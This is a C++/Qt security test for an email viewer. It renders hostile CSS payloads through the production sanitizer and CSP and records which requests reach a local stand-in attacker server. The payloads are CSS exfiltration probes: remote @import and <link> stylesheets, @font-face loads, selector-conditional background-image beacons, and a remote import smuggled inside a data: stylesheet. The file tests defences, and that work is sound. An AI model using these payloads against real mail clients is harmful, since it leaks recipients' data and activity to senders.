// SPDX-FileCopyrightText: (c) 2026 Daniel Duris, dusoft@staznosti.sk
// SPDX-License-Identifier: LGPL-3.0-or-later

// What sender CSS can pull off the network from inside a rendered message.
//
// Motivated by PortSwigger's "CSS: the bomb inside your inbox"
// (doc/research/css-the-bomb-inside-your-inbox.md), which shows CSS alone —
// no JavaScript — exfiltrating data and hijacking webmail UI. Most of that
// research does not reach us: the chrome around a message is QML, not DOM, and
// nothing the user owns is ever put in the message document. What *is* ours to
// answer is the network: which requests a hostile stylesheet can still make.
//
// So this runs each payload through the production path — sanitizeMessageHtml(),
// messageCsp(), ViewerSchemeHandler, a WebEngineView configured like
// SandboxedWebView.qml — against a local server standing in for the attacker,
// and records what actually arrives there. No mocks: the CSP and the request
// interceptor are the real ones.
//
// Exit 0 = every channel closed that should be.

#include <QEventLoop>
#include <QGuiApplication>
#include <QHostAddress>
#include <QQmlApplicationEngine>
#include <QSet>
#include <QTcpServer>
#include <QTcpSocket>
#include <QTimer>
#include <QtWebEngineQuick/qtwebenginequickglobal.h>

#include "../src/viewersecurity.h"

#include <cstdio>

/// qInfo() is silent in some Qt logging configurations; a test has to speak.
#define LOG(...) do { fprintf(stderr, __VA_ARGS__); fputc('\n', stderr); } while (0)

/// Stands in for the attacker's host. Records the path of every request that
/// reaches it and answers each one, so a load that *was* permitted completes
/// rather than hanging and looking like a block.
class EvilServer : public QTcpServer
{
public:
    QSet<QString> hits;

    void reset() { hits.clear(); }

protected:
    void incomingConnection(qintptr descriptor) override
    {
        auto *socket = new QTcpSocket(this);
        socket->setSocketDescriptor(descriptor);
        connect(socket, &QTcpSocket::readyRead, this, [this, socket] {
            const QByteArray request = socket->readAll();
            const QList<QByteArray> parts = request.split(' ');
            if (parts.size() >= 2)
                hits.insert(QString::fromLatin1(parts.at(1)));
            // text/css so a stylesheet that gets through actually applies —
            // a request blocked at the CSP and one answered with a type the
            // engine rejects must not look alike.
            socket->write("HTTP/1.1 200 OK\r\nContent-Type: text/css\r\n"
                          "Content-Length: 4\r\nConnection: close\r\n\r\n/**/");
            socket->disconnectFromHost();
        });
        connect(socket, &QTcpSocket::disconnected, socket, &QObject::deleteLater);
    }
};

namespace {

/// One attack, and what each of the two remote-content settings must do to it.
struct Payload {
    const char *name;
    QString body;      ///< message HTML, with %1 replaced by the attacker origin
    QString probe;     ///< request path that proves the channel opened
    bool allowedWhenRemoteOn; ///< false = must stay blocked even after opt-in
    const char *note;
};

QList<Payload> payloads()
{
    return {
        // The control. This is what the remote-content toggle exists for, and
        // it must keep working — a test that passes by breaking images has
        // proved nothing.
        {"remote image",
         QStringLiteral("<img src=\"%1/img\">"),
         QStringLiteral("/img"), true,
         "the toggle's whole purpose"},

        // Article §"CSS mutation"/"recursive stylesheet loading": a remote
        // stylesheet is not decoration, it is a channel the sender can keep
        // rewriting after the mail was delivered and scanned.
        {"@import stylesheet",
         QStringLiteral("<style>@import url(\"%1/import\");</style>"),
         QStringLiteral("/import"), false,
         "dynamic CSS delivered after delivery"},

        {"<link> stylesheet",
         QStringLiteral("<link rel=\"stylesheet\" href=\"%1/link\">"),
         QStringLiteral("/link"), false,
         "same channel, different tag"},

        // Article §3: @font-face with descent-override and unicode-range turns
        // rendered height into an oracle for the characters on screen.
        {"@font-face src",
         QStringLiteral("<style>@font-face{font-family:X;src:url(\"%1/font\")}"
                        "body{font-family:X}</style>probe text</style>"),
         QStringLiteral("/font"), false,
         "font-metric oracle (article §3)"},

        // Article §2. Kept in the suite deliberately: this one is *expected*
        // to fire once remote content is on, because background-image is an
        // image load. It is harmless here only because the document holds
        // nothing but the sender's own markup — see the report at the end.
        {"attribute-selector probe",
         QStringLiteral("<style>a[href^=\"https://bank\"]"
                        "{background-image:url(\"%1/attrsel\")}</style>"
                        "<a href=\"https://bank.example/acct\">x</a>"),
         QStringLiteral("/attrsel"), true,
         "selector-conditional image; no private target in our document"},

        {":has() selector probe",
         QStringLiteral("<style>body:has(a[href*=\"secret\"])"
                        "{background-image:url(\"%1/has\")}</style>"
                        "<a href=\"https://x/secret\">y</a>"),
         QStringLiteral("/has"), true,
         "same class as attribute-selector probe"},

        // data: is permitted as a *source* of styles and images — it is how
        // inline parts arrive, and a data: URL is self-contained, so it cannot
        // carry anything back to the sender by itself. What it must not become
        // is a wrapper that launders a remote fetch past the rules above: a
        // stylesheet is still a stylesheet when it arrives as data:, and the
        // @import inside one has to be refused exactly like a direct one.
        {"data: stylesheet @import",
         QStringLiteral("<link rel=\"stylesheet\" "
                        "href=\"data:text/css,@import url('%1/data-import');\">"),
         QStringLiteral("/data-import"), false,
         "remote stylesheet smuggled inside a data: stylesheet"},

        // The other half of the same question: a data: stylesheet asking for a
        // remote *image* is no different from an inline <style> doing it, and
        // is allowed on the same terms.
        {"data: stylesheet image",
         QStringLiteral("<link rel=\"stylesheet\" href=\"data:text/css,"
                        "body{background-image:url('%1/data-img')}\">"),
         QStringLiteral("/data-img"), true,
         "image load; same standing as inline CSS"},
    };
}

} // namespace

int main(int argc, char *argv[])
{
    qputenv("QT_QPA_PLATFORM", "offscreen");
    ViewerSchemeHandler::registerScheme();
    QtWebEngineQuick::initialize();
    QGuiApplication app(argc, argv);

    EvilServer evil;
    if (!evil.listen(QHostAddress::LocalHost, 0)) {
        LOG("FAIL: could not start the local attacker server: %s",
                  qPrintable(evil.errorString()));
        return 2;
    }
    const QString origin = QStringLiteral("http://127.0.0.1:%1").arg(evil.serverPort());

    ViewerSchemeHandler *handler = ViewerSchemeHandler::install();
    const quint64 context = handler->allocateContext();

    QQmlApplicationEngine engine;
    // Mirrors SandboxedWebView.qml. If that file's settings change, this test
    // is measuring something the app no longer does.
    engine.loadData(QByteArrayLiteral(
        "import QtQuick\n"
        "import QtWebEngine\n"
        "Window { visible: true; width: 800; height: 600\n"
        "  WebEngineView { objectName: \"web\"; anchors.fill: parent\n"
        "    settings.javascriptEnabled: false\n"
        "    settings.pluginsEnabled: false\n"
        "    settings.localContentCanAccessFileUrls: false\n"
        "    settings.localContentCanAccessRemoteUrls: false\n"
        "    settings.localStorageEnabled: false\n"
        "    settings.autoLoadImages: true\n"
        "    settings.hyperlinkAuditingEnabled: false\n"
        "  }\n"
        "}\n"));
    if (engine.rootObjects().isEmpty()) {
        LOG("FAIL: QML did not load");
        return 2;
    }
    QObject *web = engine.rootObjects().first()->findChild<QObject *>("web");

    // Renders one payload and gives the engine time to make (or fail to make)
    // its requests. A block shows up as silence, so the wait has to outlast a
    // request that would have succeeded — the attacker server is on loopback
    // and answers immediately, so this is generous.
    auto render = [&](const QString &body, bool allowRemote) {
        handler->setRemoteContentAllowed(allowRemote);
        const QByteArray page = QByteArrayLiteral("<meta charset=\"utf-8\">")
            + messageCsp(allowRemote) + sanitizeMessageHtml(body).toUtf8();
        web->setProperty("url", handler->setMessageHtml(context, page));
        QEventLoop loop;
        QTimer::singleShot(1200, &loop, &QEventLoop::quit);
        loop.exec();
    };

    struct Failure {
        QString what;
    };
    QList<Failure> failures;
    QStringList reachedWithRemoteOn;

    LOG("attacker origin: %s", qPrintable(origin));
    LOG("");
    LOG("%-28s %-22s %s", "payload", "remote content OFF", "remote content ON");
    LOG("%-28s %-22s %s", "---------------------------", "---------------------",
          "-----------------");

    for (const Payload &p : payloads()) {
        const QString body = p.body.arg(origin);

        // Default state: nothing at all may leave, whatever the payload.
        evil.reset();
        render(body, false);
        const bool leakedWhileOff = evil.hits.contains(p.probe);

        evil.reset();
        render(body, true);
        const bool reachedWhileOn = evil.hits.contains(p.probe);

        if (leakedWhileOff) {
            failures.append({QStringLiteral("%1: reached the network with remote content OFF")
                                 .arg(QLatin1String(p.name))});
        }
        if (reachedWhileOn && !p.allowedWhenRemoteOn) {
            failures.append({QStringLiteral("%1: channel open once remote content is ON (%2)")
                                 .arg(QLatin1String(p.name), QLatin1String(p.note))});
        }
        if (!reachedWhileOn && p.allowedWhenRemoteOn) {
            failures.append({QStringLiteral("%1: blocked even with remote content ON — the "
                                            "toggle no longer does what it promises")
                                 .arg(QLatin1String(p.name))});
        }
        if (reachedWhileOn)
            reachedWithRemoteOn.append(QLatin1String(p.name));

        LOG("%-28s %-22s %s", p.name,
              leakedWhileOff ? "LEAKED" : "blocked",
              reachedWhileOn ? (p.allowedWhenRemoteOn ? "reached (accepted)" : "REACHED")
                             : "blocked");
    }

    LOG("");
    LOG("With remote content enabled, these still reach the sender: %s",
          reachedWithRemoteOn.isEmpty() ? "(none)"
                                        : qPrintable(reachedWithRemoteOn.join(
                                              QStringLiteral(", "))));
    LOG("They are image loads, and the message document holds only the sender's");
    LOG("own markup - no token, no draft, no other message - so a selector that");
    LOG("fires one has nothing to report back that the sender did not send.");

    if (!failures.isEmpty()) {
        LOG("");
        for (const Failure &f : failures)
            LOG("FAIL: %s", qPrintable(f.what));
        return 1;
    }
    LOG("");
    LOG("PASS: remote content off leaks nothing; the stylesheet and font channels");
    LOG("      stay closed even after the user opts in.");
    return 0;
}

